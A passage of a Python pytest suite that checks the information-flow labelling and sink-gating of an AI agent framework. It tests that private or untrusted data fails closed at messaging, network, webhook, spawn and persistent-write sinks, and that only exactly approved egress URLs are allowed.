"""Information-flow initialization, propagation, and final-egress coverage."""

from __future__ import annotations

import json
import logging
from dataclasses import replace
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import patch

import pytest
from langchain.agents.middleware import ToolCallRequest
from langchain_core.messages import ToolMessage
from langgraph.runtime import Runtime

from mimir.access_control import (
    CapabilityTier,
    ServicePrincipal,
    ServiceSinkPolicy,
    SinkCategory,
    SinkGate,
    ToolFlowDirection,
    ToolRegistry,
    approve_live_declassification,
    audit_declassification,
    create_auth_context,
    get_sink_category,
    get_tool_flow_direction,
)
from mimir.agent import (
    Agent,
    _initialize_ifc_labels,
    _auto_recall_source_labels,
    _merge_ifc_labels,
    _prompt_source_labels,
    _propagate_ifc_labels,
)
from mimir.bridges._activity_panel import ActivityPanel
from mimir.bridges.base import Bridge, MessageUpdate, SendResult
from mimir.channel_registry import ChannelRegistry
from mimir.models import (
    AgentEvent,
    AuthContext,
    InformationFlowLabels,
    InformationFlowState,
    SourceLabel,
    TurnInteractivity,
)
from mimir.turn_event_bus import TurnEventBus, TurnEventEmitter


ALL_LABELS = frozenset({"private", "confidential", "internal", "public"})


def _auth(channel: str = "slack-C1", *, roles: tuple[str, ...] = ()) -> AuthContext:
    return AuthContext(
        principal="slack-U1",
        canonical_principal="user-1",
        roles=roles,
        event_ingress=None,
        trigger="user_message",
        channel_id=channel,
        interactivity=TurnInteractivity.INTERACTIVE,
        enforcement_enabled=True,
        domain="channel",
        resource_id=channel,
        bridge_instance="slack",
    )


def _labels(
    channel: str = "slack-C1",
    *,
    labels: frozenset[str] = frozenset({"private"}),
    sources: frozenset[str] | None = None,
    principal: str = "user-1",
    bridge_instance: str = "slack",
) -> InformationFlowLabels:
    channels = sources if sources is not None else frozenset({channel})
    return InformationFlowLabels(
        labels=labels,
        source_channels=channels,
        sources=frozenset(
            SourceLabel(
                principal=principal,
                domain="channel",
                resource_id=source,
                bridge_instance=bridge_instance,
                sensitivity=label,
                authorized_principals=frozenset({principal}),
            )
            for source in channels
            for label in labels
        ),
    )


def test_initializes_before_first_model_call_from_ingress_and_preloaded_context():
    event = AgentEvent(
        trigger="user_message",
        channel_id="slack-C1",
        content="hello",
        source="slack",
        attachment_names=["confidential-plan.pdf"],
    )
    preloaded = _labels(labels=frozenset({"internal"}))

    initialized = _initialize_ifc_labels(
        event,
        event.attachment_names,
        preloaded_labels=preloaded,
    )

    assert initialized.labels == frozenset({"private", "internal"})
    assert initialized.source_channels == frozenset({"slack-C1"})


def test_two_principals_in_shared_channel_fail_closed():
    decision = SinkGate.check_sink_flow(
        "harness_auto_deliver",
        "slack-C1",
        _labels(principal="user-2"),
        _auth(),
        enforce=True,
    )
    assert decision.allowed is False


def test_same_textual_channel_on_different_bridge_instance_fails_closed():
    decision = SinkGate.check_sink_flow(
        "harness_auto_deliver",
        "slack-C1",
        _labels(bridge_instance="slack-workspace-2"),
        _auth(),
        enforce=True,
    )
    assert decision.allowed is False


def test_labels_without_source_provenance_fail_closed():
    labels = InformationFlowLabels(
        labels=frozenset({"private"}),
        source_channels=frozenset({"slack-C1"}),
    )
    decision = SinkGate.check_sink_flow(
        "harness_auto_deliver", "slack-C1", labels, _auth(), enforce=True,
    )
    assert decision.allowed is False


@pytest.mark.parametrize(
    ("trigger", "service_principal", "channel_id", "source", "integrity"),
    [
        ("scheduled_tick", "scheduler", "scheduler:heartbeat", None, "trusted"),
        ("saga_session_end", "synthesis", "synthesis:session", "system", "trusted"),
    ],
)
def test_trusted_authorless_service_can_egress_to_triggering_channel_under_enforce(
    trigger: str,
    service_principal: str,
    channel_id: str,
    source: str | None,
    integrity: str,
):
    event = AgentEvent(
        trigger=trigger,
        channel_id=channel_id,
        source=source,
        service_principal=service_principal,
    )
    labels = _initialize_ifc_labels(event)
    auth = create_auth_context(event, enforce=True, ifc_labels=labels)

    assert labels.sources == frozenset({
        SourceLabel(
            principal=f"service:{service_principal}",
            domain="channel",
            resource_id=channel_id,
            bridge_instance=source or f"service:{service_principal}",
            sensitivity="internal",
            authorized_principals=frozenset({f"service:{service_principal}"}),
            source_kind="service",
            integrity=integrity,
        )
    })
    decision = SinkGate.check_sink_flow(
        "send_message", channel_id, labels, auth, enforce=True,
    )
    assert decision.allowed is True
    assert decision.reason == "ifc_allowed"


def test_unstamped_authorless_synthetic_event_still_fails_closed():
    event = AgentEvent(
        trigger="poller",
        channel_id="poller:github-activity",
        source="poller",
    )
    labels = _initialize_ifc_labels(event)
    auth = create_auth_context(event, enforce=True, ifc_labels=labels)

    decision = SinkGate.check_sink_flow(
        "send_message", event.channel_id, labels, auth, enforce=True,
    )
    assert decision.allowed is False


def test_mixed_principal_sources_fail_closed_without_declassification():
    labels = _merge_ifc_labels(_labels(), _labels(principal="user-2"))
    decision = SinkGate.check_sink_flow(
        "harness_auto_deliver", "slack-C1", labels, _auth(), enforce=True,
    )
    assert decision.allowed is False


def test_service_derived_source_intersects_input_acls():
    from mimir.models import SourceLabel

    alice_and_ops = SourceLabel(
        principal="service-a", domain="memory", resource_id="a",
        bridge_instance="saga", sensitivity="private",
        authorized_principals=frozenset({"alice", "ops"}),
    )
    alice_and_bob = SourceLabel(
        principal="service-b", domain="memory", resource_id="b",
        bridge_instance="saga", sensitivity="private",
        authorized_principals=frozenset({"alice", "bob"}),
    )
    derived = SourceLabel.derived(
        frozenset({alice_and_ops, alice_and_bob}),
        principal="summarizer", domain="memory", resource_id="summary",
        bridge_instance="saga", sensitivity="private",
    )
    assert derived.authorized_principals == frozenset({"alice"})


def test_source_label_derived_propagates_least_trust_and_active_ingest():
    trusted_info = SourceLabel(
        principal="a", domain="memory", resource_id="a", bridge_instance="saga",
        sensitivity="private", authorized_principals=frozenset({"alice"}),
        integrity="trusted", integrity_effect="informational",
    )
    untrusted_active = SourceLabel(
        principal="b", domain="web", resource_id="b", bridge_instance="web",
        sensitivity="internal", authorized_principals=frozenset({"alice"}),
        integrity="untrusted", integrity_effect="active_ingest",
    )

    trusted_derived = SourceLabel.derived(
        frozenset({trusted_info}), principal="service:test", domain="memory",
        resource_id="trusted", bridge_instance="saga", sensitivity="private",
    )
    mixed_derived = SourceLabel.derived(
        frozenset({trusted_info, untrusted_active}), principal="service:test",
        domain="memory", resource_id="mixed", bridge_instance="saga",
        sensitivity="private",
    )

    # The trusted-only assertion makes this regression non-masked by the
    # SourceLabel fail-closed defaults if derived() drops the integrity fields.
    assert (trusted_derived.integrity, trusted_derived.integrity_effect) == (
        "trusted", "informational",
    )
    assert (mixed_derived.integrity, mixed_derived.integrity_effect) == (
        "untrusted", "active_ingest",
    )


def test_integrity_gate_helper_is_exact_and_least_trusted_on_mixing():
    informational = SourceLabel(
        principal="memory", domain="saga", resource_id="1", bridge_instance="saga",
        sensitivity="private", integrity="untrusted", integrity_effect="informational",
    )
    active = SourceLabel(
        principal="web", domain="web", resource_id="2", bridge_instance="web",
        sensitivity="internal", integrity="untrusted", integrity_effect="active_ingest",
    )
    labels = InformationFlowLabels().with_source(informational)
    assert labels.has_untrusted_active_ingest is False
    assert InformationFlowState(labels=labels).has_untrusted_active_ingest() is False

    mixed = labels.with_source(active)
    assert mixed.has_untrusted_active_ingest is True
    assert InformationFlowState(labels=mixed).has_untrusted_active_ingest() is True


@pytest.mark.parametrize(
    ("event", "expected"),
    [
        (AgentEvent(trigger="user_message", channel_id="slack-C1", author="slack-U1", source="slack"), "trusted"),
        (AgentEvent(trigger="user_message", channel_id="api", author="claimed", source="http"), "untrusted"),
        (AgentEvent(trigger="unknown", channel_id="external", source="external"), "untrusted"),
    ],
)
def test_ingress_integrity_derivation_defaults_fail_closed(event: AgentEvent, expected: str):
    source = next(iter(_initialize_ifc_labels(event).sources))
    assert source.integrity == expected
    assert source.integrity_effect == "active_ingest"


def test_protected_prompt_sources_are_informational():
    source = next(iter(_prompt_source_labels(
        _auth(), domain="saga", resource="auto-recall",
    ).sources))
    assert source.integrity == "untrusted"
    assert source.integrity_effect == "informational"


def test_auto_recalled_untrusted_atom_is_visible_but_never_active_ingest():
    auth = _auth()
    labels = _auto_recall_source_labels(auth, {"_ifc_sources": [{
        "resource_id": "atom:a1",
        "owner_principal": "user-1",
        "integrity": "untrusted",
        "origin_trigger": "research-poller:hn-ai",
        "origin_ref": "https://example.test/item/1",
    }]})

    source = next(iter(labels.sources))
    assert source.integrity == "untrusted"
    assert source.integrity_effect == "informational"
    assert labels.has_untrusted_active_ingest is False


def test_delegation_wires_service_derived_acl_intersection_into_carrier():
    alice_and_ops = SourceLabel(
        principal="alice", domain="channel", resource_id="slack-C1",
        bridge_instance="slack", sensitivity="private",
        authorized_principals=frozenset({"alice", "ops"}),
    )
    alice_and_bob = SourceLabel(
        principal="alice", domain="channel", resource_id="slack-C1",
        bridge_instance="slack", sensitivity="private",
        authorized_principals=frozenset({"alice", "bob"}),
    )
    parent = InformationFlowLabels(
        labels=frozenset({"private"}),
        source_channels=frozenset({"slack-C1"}),
        sources=frozenset({alice_and_ops, alice_and_bob}),
    )

    propagated = _propagate_ifc_labels(
        parent,
        "slack-C1",
        _auth(),
        derived_by="task",
    )

    derived = [source for source in propagated.sources if source.source_kind == "service"]
    assert len(derived) == 1
    assert derived[0].principal == "service:task"
    assert derived[0].authorized_principals == frozenset({"alice"})
    assert parent.sources <= propagated.sources


def test_service_derived_source_can_flow_when_destination_principal_is_in_intersection():
    ingress = SourceLabel(
        principal="user-1", domain="channel", resource_id="slack-C1",
        bridge_instance="slack", sensitivity="private",
        authorized_principals=frozenset({"user-1", "ops"}),
    )
    derived = SourceLabel.derived(
        frozenset({ingress}),
        principal="service:task",
        domain="channel",
        resource_id="slack-C1",
        bridge_instance="slack",
        sensitivity="private",
    )
    labels = InformationFlowLabels(
        labels=frozenset({"private"}),
        source_channels=frozenset({"slack-C1"}),
        sources=frozenset({ingress, derived}),
    )

    decision = SinkGate.check_sink_flow(
        "harness_auto_deliver", "slack-C1", labels, _auth(), enforce=True,
    )

    assert decision.allowed is True


def test_propagates_monotonically_to_subagents_spawns_continuations_and_resumed_turns():
    parent = _labels(labels=frozenset({"private", "confidential"}))

    for boundary in ("subagent", "spawn", "continuation"):
        propagated = _propagate_ifc_labels(parent, "slack-C1", _auth())
        assert propagated.labels == parent.labels, boundary
        assert propagated.source_channels == parent.source_channels, boundary

    resumed_event = AgentEvent(
        trigger="shell_job_complete",
        channel_id="slack-C1",
        source="system",
        ifc_labels=propagated,
    )
    resumed = _initialize_ifc_labels(resumed_event)
    assert resumed.labels == parent.labels
    assert resumed.source_channels == parent.source_channels


def test_merge_cannot_erase_labels_during_continuation_or_summary():
    original = _labels(labels=frozenset({"private", "internal"}))
    asserted_public = _labels(labels=frozenset({"public"}))

    merged = _merge_ifc_labels(original, asserted_public)

    assert merged.labels == frozenset({"private", "internal", "public"})


def test_information_flow_state_merge_clean_carrier_preserves_current_taint():
    current = _labels(labels=frozenset({"private", "confidential"}))
    state = InformationFlowState(labels=current)

    merged = state.merge(InformationFlowLabels())

    assert merged.labels == current.labels
    assert merged.source_channels == current.source_channels
    assert merged.sources == current.sources


@pytest.mark.parametrize("label", sorted(ALL_LABELS))
def test_every_known_label_can_flow_to_compatible_same_channel(label: str):
    decision = SinkGate.check_sink_flow(
        "harness_auto_deliver",
        "slack-C1",
        _labels(labels=frozenset({label})),
        _auth(),
        enforce=True,
    )
    assert decision.allowed is True
    assert decision.reason == "ifc_allowed"


def test_all_labels_must_be_destination_compatible_to_pass():
    compatible = SinkGate.check_sink_flow(
        "activity_panel_edit",
        "slack-C1",
        _labels(labels=ALL_LABELS),
        _auth(),
        enforce=True,
    )
    incompatible = SinkGate.check_sink_flow(
        "activity_panel_edit",
        "slack-C1",
        _labels(labels=ALL_LABELS, sources=frozenset({"slack-C1", "slack-C2"})),
        _auth(),
        enforce=True,
    )

    assert compatible.allowed is True
    assert incompatible.allowed is False
    assert incompatible.reason == "ifc_label_blocked:same_channel"


@pytest.mark.parametrize(
    ("sink_name", "target", "labels", "expected_reason"),
    [
        ("new_harness_sink", "slack-C1", _labels(), "unknown_sink_category"),
        ("harness_auto_deliver", None, _labels(), "unknown_sink_destination"),
        (
            "harness_auto_deliver",
            "slack-C1",
            _labels(labels=frozenset({"future-secret"})),
            "ifc_label_blocked:same_channel",
        ),
        (
            "harness_auto_deliver",
            "slack-C1",
            _labels(sources=frozenset()),
            "ifc_label_blocked:same_channel",
        ),
    ],
)
def test_unknown_labels_or_destinations_fail_closed(
    sink_name: str,
    target: str | None,
    labels: InformationFlowLabels,
    expected_reason: str,
):
    decision = SinkGate.check_sink_flow(
        sink_name, target, labels, _auth(), enforce=True,
    )
    assert decision.allowed is False
    assert decision.reason == expected_reason


@pytest.mark.parametrize(
    ("tool_name", "expected_reason"),
    [
        ("fetch_url", "egress_destination_not_approved"),
        ("web_search", "egress_destination_not_approved"),
    ],
)
def test_private_turn_is_blocked_from_external_egress_tools(
    tool_name: str,
    expected_reason: str,
):
    decision = ToolRegistry().authorize_tool(
        tool_name,
        _auth(roles=("admin",)),
        enforce=True,
        target_channel="https://external.example",
        ifc_labels=_labels(),
    )

    assert decision.allowed is False
    assert decision.reason == expected_reason


@pytest.mark.parametrize("trigger", ["user_message", "poller", "scheduled_tick"])
def test_spoofed_service_trigger_cannot_bypass_open_network_sink_gate(
    trigger: str,
):
    decision = ToolRegistry().authorize_tool(
        "fetch_url",
        replace(_auth(roles=("user",)), trigger=trigger),
        enforce=True,
        target_channel="https://external.example",
        ifc_labels=_labels(),
    )

    assert decision.allowed is False
    assert decision.reason == "egress_destination_not_approved"


def test_resolved_service_keeps_network_sink_policy_behavior():
    scheduler = AuthContext(
        principal="service:scheduler",
        canonical_principal="scheduler",
        roles=("service",),
        event_ingress=None,
        trigger="scheduled_tick",
        channel_id="scheduler:heartbeat",
        interactivity=TurnInteractivity.NON_INTERACTIVE,
        is_service=True,
        enforcement_enabled=True,
    )

    decision = ToolRegistry().authorize_tool(
        "fetch_url",
        scheduler,
        enforce=True,
        target_channel="https://external.example",
        ifc_labels=_labels(
            channel="scheduler:heartbeat",
            principal="service:scheduler",
            bridge_instance="service:scheduler",
        ),
    )

    assert decision.allowed is False
    assert decision.reason == "egress_destination_not_approved"


def test_unknown_sink_category_reaches_fail_closed_gate_from_authorization():
    decision = ToolRegistry().authorize_tool(
        "future_egress_tool",
        _auth(roles=("admin",)),
        enforce=True,
        target_channel="https://external.example",
        ifc_labels=_labels(),
    )

    assert decision.allowed is False
    assert decision.reason == "unknown_sink_category"


def test_cross_principal_or_cross_channel_taint_is_blocked_at_triggering_harness_sink():
    labels = _labels(sources=frozenset({"slack-C-private"}))
    decision = SinkGate.check_sink_flow(
        "harness_auto_deliver", "slack-C-public", labels, _auth("slack-C-public"), enforce=True,
    )
    assert decision.allowed is False


def test_service_principal_cannot_bypass_incompatible_sink_labels():
    service = AuthContext(
        principal="service:scheduler",
        canonical_principal="scheduler",
        roles=("service",),
        event_ingress=None,
        trigger="scheduled_tick",
        channel_id="slack-C-public",
        interactivity=TurnInteractivity.NON_INTERACTIVE,
        is_service=True,
        enforcement_enabled=True,
    )
    decision = SinkGate.check_sink_flow(
        "harness_auto_deliver",
        "slack-C-public",
        _labels(sources=frozenset({"slack-C-private"})),
        service,
        enforce=True,
    )

    assert decision.allowed is False
    assert decision.reason == "ifc_label_blocked:same_channel"


@pytest.mark.parametrize(
    ("tool_name", "target", "sink_category"),
    [
        ("shell_exec", "printf untrusted", "shell_process"),
        ("spawn_codex", "untrusted task", "spawn"),
        ("worklink_run", "/operator/worklink", "spawn"),
        ("write_file", "/tmp/untrusted", "file"),
        ("submit_proposal", "proposal", "proposal"),
        ("ntfy_send", "alerts", "notification"),
        ("webhook", "https://example.invalid/hook", "http_webhook"),
        ("fetch_url", "https://example.invalid", "network"),
        ("external_tool", "external-server", "external_mcp"),
    ],
)
def test_poller_payload_cannot_bypass_active_sink_ifc(
    tool_name: str,
    target: str,
    sink_category: str,
):
    poller = AuthContext(
        principal="service:poller",
        canonical_principal="poller",
        roles=("service",),
        event_ingress=None,
        trigger="poller",
        channel_id="poller:external",
        interactivity=TurnInteractivity.NON_INTERACTIVE,
        is_service=True,
        enforcement_enabled=True,
    )

    decision = SinkGate.check_sink_flow(
        tool_name,
        target,
        _labels(sources=frozenset({"poller:external"})),
        poller,
        enforce=True,
        sink_category=(
            SinkCategory.EXTERNAL_MCP if sink_category == "external_mcp" else None
        ),
    )

    assert decision.allowed is False
    expected_reason = (
        "egress_destination_not_approved"
        if tool_name == "fetch_url"
        else f"ifc_label_blocked:{sink_category}"
    )
    assert decision.reason == expected_reason


def _trigger_service_context(
    service: ServicePrincipal,
    *,
    integrity: str,
    integrity_effect: str = "active_ingest",
) -> tuple[AuthContext, InformationFlowLabels]:
    channel = "poller:tier-gate"
    principal = f"service:{service.canonical}"
    auth = AuthContext(
        principal=principal,
        canonical_principal=service.canonical,
        roles=("service",),
        event_ingress=None,
        trigger=service.trigger,
        channel_id=channel,
        interactivity=TurnInteractivity.NON_INTERACTIVE,
        is_service=True,
        enforcement_enabled=True,
        service_authority=service,
    )
    labels = InformationFlowLabels().with_channel(channel).with_source(SourceLabel(
        principal=principal,
        domain="channel",
        resource_id=channel,
        bridge_instance="poller",
        sensitivity="internal",
        authorized_principals=frozenset({principal}),
        source_kind="service",
        integrity=integrity,
        integrity_effect=integrity_effect,
    ))
    return auth, labels


@pytest.mark.parametrize(
    ("integrity", "integrity_effect", "expected"),
    [
        ("trusted", "active_ingest", True),
        ("untrusted", "informational", True),
        ("untrusted", "active_ingest", False),
    ],
)
def test_worklink_integrity_gate_uses_only_untrusted_active_ingest(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    integrity: str,
    integrity_effect: str,
    expected: bool,
) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    monkeypatch.setenv("WORKLINK_REPO", str(repo))
    service = ServicePrincipal(
        canonical="poller:tier-gate",
        trigger="poller",
        capabilities=("worklink_run",),
        readable_domains=("poller_payload",),
        sink_policies=(ServiceSinkPolicy(
            "worklink_run", "worklink_repo", "WORKLINK_REPO/MIMIR_WORKLINK_REPO",
        ),),
        capability_tier=CapabilityTier.CODE_EXECUTION,
    )
    auth, labels = _trigger_service_context(
        service, integrity=integrity, integrity_effect=integrity_effect,
    )

    decision = SinkGate.check_sink_flow(
        "worklink_run", str(repo), labels, auth, enforce=True,
    )

    assert decision.allowed is expected


def test_generic_spawn_is_blocked_even_for_trusted_trigger(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("MIMIR_HOME", str(tmp_path))
    service = ServicePrincipal(
        canonical="poller:tier-gate",
        trigger="poller",
        capabilities=("spawn_codex",),
        readable_domains=("poller_payload",),
        sink_policies=(ServiceSinkPolicy(
            "spawn_codex", "spawn_workspace", "MIMIR_HOME/MIMIR_FILE_TOOL_ROOTS",
        ),),
        capability_tier=CapabilityTier.CODE_EXECUTION,
    )
    auth, labels = _trigger_service_context(service, integrity="trusted")

    decision = SinkGate.check_sink_flow(
        "spawn_codex", str(tmp_path), labels, auth, enforce=True,
    )

    assert decision.allowed is False
    assert decision.reason == "ifc_label_blocked:spawn"


def test_poller_destination_safe_fetch_is_taint_independent(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    destination = "https://approved.example/fixed"
    monkeypatch.setenv("MIMIR_HEARTBEAT_APPROVED_URLS", destination)
    service = ServicePrincipal(
        canonical="poller:tier-gate",
        trigger="poller",
        capabilities=("fetch_url",),
        readable_domains=("poller_payload",),
        sink_policies=(ServiceSinkPolicy(
            "fetch_url", "approved_urls", "MIMIR_HEARTBEAT_APPROVED_URLS",
        ),),
        capability_tier=CapabilityTier.UNBOUNDED,
    )
    trusted_auth, trusted_labels = _trigger_service_context(service, integrity="trusted")
    untrusted_auth, untrusted_labels = _trigger_service_context(service, integrity="untrusted")

    trusted = SinkGate.check_sink_flow(
        "fetch_url", destination, trusted_labels, trusted_auth, enforce=True,
    )
    untrusted = SinkGate.check_sink_flow(
        "fetch_url", destination, untrusted_labels, untrusted_auth, enforce=True,
    )

    assert trusted.allowed is True
    assert untrusted.allowed is True


def test_heartbeat_fetches_multiple_approved_exact_urls_after_untrusted_ingest(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    destination = "https://approved.example/fixed?check=1"
    second_destination = "https://approved.example/other?check=2"
    monkeypatch.setenv(
        "MIMIR_HEARTBEAT_APPROVED_URLS",
        f"{destination},{second_destination}",
    )
    service = ServicePrincipal(
        canonical="heartbeat",
        trigger="scheduled_tick",
        capabilities=("fetch_url",),
        readable_domains=("configured_inputs",),
        sink_policies=(ServiceSinkPolicy(
            "fetch_url", "approved_urls", "MIMIR_HEARTBEAT_APPROVED_URLS",
        ),),
        capability_tier=CapabilityTier.UNBOUNDED,
    )
    auth, labels = _trigger_service_context(service, integrity="untrusted")

    first = SinkGate.check_sink_flow(
        "fetch_url", destination, labels, auth, enforce=True,
    )
    second = SinkGate.check_sink_flow(
        "fetch_url", second_destination, labels, auth, enforce=True,
    )
    other_path = SinkGate.check_sink_flow(
        "fetch_url", "https://approved.example/unlisted", labels, auth, enforce=True,
    )

    assert first.allowed is True
    assert second.allowed is True
    assert other_path.reason == "egress_destination_not_approved"


def test_web_search_is_allowed_after_untrusted_active_ingest(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    target = "https://api.tavily.com/search"
    monkeypatch.setenv("MIMIR_TEST_SEARCH_URLS", target)
    service = ServicePrincipal(
        canonical="heartbeat",
        trigger="scheduled_tick",
        capabilities=("web_search",),
        readable_domains=("configured_inputs",),
        sink_policies=(ServiceSinkPolicy(
            "web_search", "approved_urls", "MIMIR_TEST_SEARCH_URLS",
        ),),
        capability_tier=CapabilityTier.UNBOUNDED,
    )
    auth, labels = _trigger_service_context(service, integrity="untrusted")
    decision = SinkGate.check_sink_flow(
        "web_search", target, labels, auth, enforce=True,
    )

    assert decision.allowed is True


@pytest.mark.parametrize(
    ("tool_name", "target", "sink_category", "expected_reason"),
    [
        (
            "webhook",
            "https://audience.example/hook",
            None,
            "ifc_label_blocked:http_webhook",
        ),
        (
            "http_request",
            "https://audience.example/hook",
            None,
            "ifc_label_blocked:http_webhook",
        ),
        (
            "mcp_external_tool",
            "external-server/tool",
            SinkCategory.EXTERNAL_MCP,
            "ifc_label_blocked:external_mcp",
        ),
    ],
)
def test_audience_egress_and_mcp_remain_blocked_after_untrusted_active_ingest(
    monkeypatch: pytest.MonkeyPatch,
    tool_name: str,
    target: str,
    sink_category: SinkCategory | None,
    expected_reason: str,
) -> None:
    monkeypatch.setenv("MIMIR_EGRESS_APPROVED_URLS", "https://audience.example/hook")
    source = SourceLabel(
        principal="external-source",
        domain="tool",
        resource_id="untrusted-result",
        bridge_instance="web",
        sensitivity="internal",
        authorized_principals=frozenset({"user-1"}),
        source_kind="protected_tool",
        integrity="untrusted",
        integrity_effect="active_ingest",
    )
    labels = _labels().with_source(source)

    decision = SinkGate.check_sink_flow(
        tool_name,
        target,
        labels,
        _auth(roles=("admin",)),
        enforce=True,
        sink_category=sink_category,
    )

    assert decision.allowed is False
    assert decision.reason == expected_reason


def test_user_approval_adds_only_one_exact_url_to_session(tmp_path: Path) -> None:
    from mimir.event_logger import _reset_logger_for_tests, init_logger

    source = SourceLabel(
        principal="user-1", domain="channel", resource_id="slack-C1",
        bridge_instance="slack", sensitivity="private",
        authorized_principals=frozenset({"user-1"}), integrity="trusted",
        integrity_effect="active_ingest",
    )
    labels = InformationFlowLabels().with_channel("slack-C1").with_source(source)
    auth = replace(_auth(roles=("admin",)), ifc_labels=labels)
    exact = "https://example.test/report?day=1"
    init_logger(tmp_path / "events.jsonl", session_id="egress-approval-test")
    try:
        assert SinkGate.check_sink_flow(
            "fetch_url", exact, labels, auth, enforce=True,
        ).reason == "egress_destination_not_approved"
        assert approve_live_declassification(
            auth, sink_category="network", destination=exact,
            reason="operator approved this exact fetch URL",
        ) == (True, "approved")
    finally:
        _reset_logger_for_tests()

    assert SinkGate.check_sink_flow(
        "fetch_url", exact, labels, auth, enforce=True,
    ).allowed is True
    assert SinkGate.check_sink_flow(
        "fetch_url", "https://example.test/report?day=2", labels, auth, enforce=True,
    ).reason == "egress_destination_not_approved"
    assert SinkGate.check_sink_flow(
        "fetch_url", "https://example.test/other?day=1", labels, auth, enforce=True,
    ).reason == "egress_destination_not_approved"


def test_approved_fetch_destination_remains_taint_independent(
    tmp_path: Path,
) -> None:
    from mimir.event_logger import _reset_logger_for_tests, init_logger

    destination = "https://example.test/fixed"
    labels = _labels()
    auth = replace(_auth(roles=("admin",)), ifc_labels=labels)
    init_logger(tmp_path / "events.jsonl", session_id="egress-payload-test")
    try:
        assert approve_live_declassification(
            auth, sink_category="network", destination=destination,
            reason="approve this exact fetch URL for the session",
        ) == (True, "approved")
    finally:
        _reset_logger_for_tests()

    first = SinkGate.check_sink_flow(
        "fetch_url", destination, labels, auth, enforce=True,
    )
    later = SinkGate.check_sink_flow(
        "fetch_url", destination, labels, auth, enforce=True,
    )

    assert first.allowed is True
    assert first.reason == "ifc_allowed"
    assert later.allowed is True
    assert later.reason == "ifc_allowed"


def test_trigger_sink_must_be_exact_declared_capability() -> None:
    service = ServicePrincipal(
        canonical="poller:tier-gate",
        trigger="poller",
        capabilities=("saga_feedback",),
        readable_domains=("poller_payload",),
        capability_tier=CapabilityTier.SCOPED_WITH_PROVENANCE,
    )
    auth, labels = _trigger_service_context(service, integrity="untrusted")

    declared = SinkGate.check_sink_flow(
        "saga_feedback", "saga", labels, auth, enforce=True,
    )
    undeclared = SinkGate.check_sink_flow(
        "memory_store", "saga", labels, auth, enforce=True,
    )

    assert declared.allowed is True
    assert undeclared.allowed is False


def test_visibility_qualified_service_source_is_bound_to_triggering_channel():
    event = AgentEvent(
        trigger="scheduled_tick",
        channel_id="scheduler:heartbeat",
        service_principal="scheduler",
        extra={"channel_visibility": "private"},
    )
    auth = create_auth_context(event, enforce=True)
    labels = InformationFlowLabels(
        labels=frozenset({"private"}),
        source_channels=frozenset({event.channel_id}),
        sources=frozenset({SourceLabel(
            principal="service:scheduler",
            domain="channel:private",
            resource_id="scheduler:other",
            bridge_instance="service:scheduler",
            sensitivity="private",
            authorized_principals=frozenset({"service:scheduler"}),
            source_kind="service",
        )}),
    )

    decision = SinkGate.check_sink_flow(
        "send_message", event.channel_id, labels, auth, enforce=True,
    )

    assert decision.allowed is False
    assert decision.reason == "ifc_label_blocked:same_channel"


@pytest.mark.parametrize(
    ("source_resource", "expected_allowed"),
    [
        ("slack-C-other", False),
        ("slack-C1", True),
    ],
)
def test_protected_prompt_source_is_bound_to_triggering_channel(
    source_resource: str,
    expected_allowed: bool,
):
    labels = InformationFlowLabels(
        labels=frozenset({"private"}),
        sources=frozenset({SourceLabel(
            principal="user-2",
            domain="recent_activity",
            resource_id=source_resource,
            bridge_instance="slack",
            sensitivity="private",
            authorized_principals=frozenset({"user-1"}),
            source_kind="protected_prompt",
        )}),
    )

    decision = SinkGate.check_sink_flow(
        "harness_auto_deliver", "slack-C1", labels, _auth(), enforce=True,
    )

    assert decision.allowed is expected_allowed
    assert decision.reason == (
        "ifc_allowed" if expected_allowed else "ifc_label_blocked:same_channel"
    )


@pytest.mark.parametrize(
    ("tool_name", "sink_category"),
    [
        ("memory_store", SinkCategory.SAGA),
        ("add_schedule", SinkCategory.SCHEDULER),
    ],
)
def test_persistent_writes_are_ifc_gated_not_merely_admin_gated(
    tool_name: str,
    sink_category: SinkCategory,
):
    decision = ToolRegistry().authorize_tool(
        tool_name,
        _auth(roles=("admin",)),
        enforce=True,
        ifc_labels=_labels(),
    )

    assert decision.allowed is False
    assert decision.reason == f"ifc_label_blocked:{sink_category.value}"


@pytest.mark.parametrize(
    ("tool_name", "sink_category"),
    [
        ("set_poller_overrides", SinkCategory.SCHEDULER),
        ("reload_pollers", SinkCategory.SCHEDULER),
        ("remove_schedule", SinkCategory.SCHEDULER),
        ("commitment_complete", SinkCategory.SAGA),
        ("commitment_snooze", SinkCategory.SAGA),
        ("commitment_dismiss", SinkCategory.SAGA),
        ("request_mimir_update", SinkCategory.FILE),
        ("rebuild_index", SinkCategory.FILE),
    ],
)
def test_inventory_omission_mutations_are_explicit_ifc_sinks(
    tool_name: str,
    sink_category: SinkCategory,
) -> None:
    assert get_tool_flow_direction(tool_name) is ToolFlowDirection.SINK
    assert get_sink_category(tool_name) is sink_category

    decision = ToolRegistry().authorize_tool(
        tool_name,
        _auth(roles=("admin",)),
        enforce=True,
        ifc_labels=_labels(),
    )

    assert decision.allowed is False
    assert decision.reason == f"ifc_label_blocked:{sink_category.value}"


@pytest.mark.asyncio
async def test_tainted_poller_override_is_denied_before_handler_execution() -> None:
    from mimir.tools.budget_gate import BudgetGateMiddleware

    auth = replace(_auth(roles=("admin",)), ifc_labels=_labels())
    request = ToolCallRequest(
        tool_call={
            "name": "set_poller_overrides",
            "args": {"poller_name": "mail", "overrides": {"prompt": "tainted"}},
            "id": "ifc-poller-override",
            "type": "tool_call",
        },
        tool=None,
        state=None,
        runtime=Runtime(context=auth),
    )
    handler_calls = 0

    async def handler(_request: ToolCallRequest) -> ToolMessage:
        nonlocal handler_calls
        handler_calls += 1
        return ToolMessage(content="mutated", tool_call_id="ifc-poller-override")

    result = await BudgetGateMiddleware().awrap_tool_call(request, handler)

    assert handler_calls == 0
    assert result.status == "error"
    assert "ifc_label_blocked:scheduler" in str(result.content)


@pytest.mark.parametrize(
    ("tool_name", "expected_direction"),
    [
        ("commitment_list", ToolFlowDirection.SOURCE),
        ("write_todos", ToolFlowDirection.NEITHER),
    ],
)
def test_non_sink_tools_have_explicit_flow_directions(
    tool_name: str,
    expected_direction: ToolFlowDirection,
) -> None:
